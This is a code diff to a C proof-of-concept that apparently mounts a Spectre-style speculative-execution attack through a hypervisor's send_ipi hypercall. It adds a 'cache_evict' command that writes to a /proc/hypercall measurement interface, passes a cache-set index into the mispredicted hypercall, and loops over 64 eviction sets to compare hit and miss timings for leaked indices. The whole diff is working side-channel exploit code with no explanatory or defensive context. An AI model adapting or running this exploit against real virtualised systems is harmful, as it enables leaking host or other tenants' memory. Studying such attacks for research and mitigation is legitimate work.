@@ -30,6 +30,20 @@ int hypercall(struct send_ipi_hypercall *opts) {
   return b;
 }
 
+void determine_cache_eviction(void *leak) {
+  const char *hypercall_path = "/proc/hypercall/measure_cache_eviction_set";
+  int fd = open(hypercall_path, O_WRONLY);
+  if (fd < 0) {
+    err(fd, "Failed to open %s", hypercall_path);
+  }
+
+  int b = write(fd, leak, LEAK_PAGE_SIZE);
+  close(fd);
+  if (b < 0) {
+    err(errno, "Failed to write to %s", hypercall_path);
+  }
+}
+
 size_t calculate_min(const uintptr_t phys_page_addr, const uintptr_t phys_map_addr) {
   // It is below the phys_map, and thus unreachable
   if (phys_page_addr < phys_map_addr) {
@@ -39,9 +53,11 @@ size_t calculate_min(const uintptr_t phys_page_addr, const uintptr_t phys_map_ad
   return (phys_page_addr - phys_map_addr) / 8;
 }
 
-size_t access_buffer_with_spectre(void *buf, const size_t idx, const size_t iters) {
-  struct send_ipi_hypercall opts = {
-      .real = {.mask_low = -1, .min = 0}, .mispredicted = {.mask_low = -1, .min = idx}, .ptr = buf};
+size_t access_buffer_with_spectre(void *buf, const size_t idx, const size_t iters, int set_idx) {
+  struct send_ipi_hypercall opts = {.real = {.mask_low = -1, .min = 0},
+                                    .mispredicted = {.mask_low = -1, .min = idx},
+                                    .ptr = buf,
+                                    .cache_set_idx = set_idx};
 
   size_t min = -1;
   for (size_t i = 0; i < iters; ++i) {
@@ -91,9 +107,9 @@ size_t find_min(void *buf) {
       for (int64_t page = PAGES_IN_BATCH - 1; page >= 0; --page) {
         size_t idx = batch + (ELEMENTS_PER_PAGE * page) + offset;
 
-        size_t time = access_buffer_with_spectre(buf, idx, 1);
+        size_t time = access_buffer_with_spectre(buf, idx, 1, 0);
         if (time < 220) {
-          time = access_buffer_with_spectre(buf, idx, 1000);
+          time = access_buffer_with_spectre(buf, idx, 1000, 0);
           if (time < 100) {
             printf("\nhit: %lx %ld\n", idx, time);
             return idx;
@@ -114,7 +130,7 @@ size_t find_min(void *buf) {
 void cmd_determine(void *leak_page) {
   *(uint64_t *)leak_page = page_value;
   getchar();
-  access_buffer_with_spectre(leak_page, 1, 1);
+  access_buffer_with_spectre(leak_page, 1, 1, 0);
   *(uint64_t *)leak_page = 0;
 }
 
@@ -154,12 +170,13 @@ void cmd_test_spectre(int argc, char *argv[argc], void *leak_page) {
   }
 
   const size_t iterations = 10000;
-  printf("Running with min %lx\n", min);
-  size_t hit = access_buffer_with_spectre(leak_page, min, iterations);
-  printf("Running with min %lx\n", ~min);
-  size_t miss = access_buffer_with_spectre(leak_page, ~min, iterations);
+  for (int set_idx = 0; set_idx < 64; ++set_idx) {
 
-  printf("Miss: %ld\tHit: %ld\n", miss, hit);
+    size_t hit = access_buffer_with_spectre(leak_page, min, iterations, set_idx);
+    size_t miss = access_buffer_with_spectre(leak_page, ~min, iterations, set_idx);
+
+    printf("Miss: %ld\tHit: %ld\n", miss, hit);
+  }
 }
 
 int main(int argc, char *argv[argc]) {
@@ -189,6 +206,8 @@ int main(int argc, char *argv[argc]) {
   } else if (!strcmp(argv[1], "find_min")) {
     size_t min = find_min(leak_page);
     printf("Min: %ld (or 0x%lx)\n", min, min);
+  } else if (!strcmp(argv[1], "cache_evict")) {
+    determine_cache_eviction(leak_page);
   }
 
   munmap(leak_page, LEAK_PAGE_SIZE);
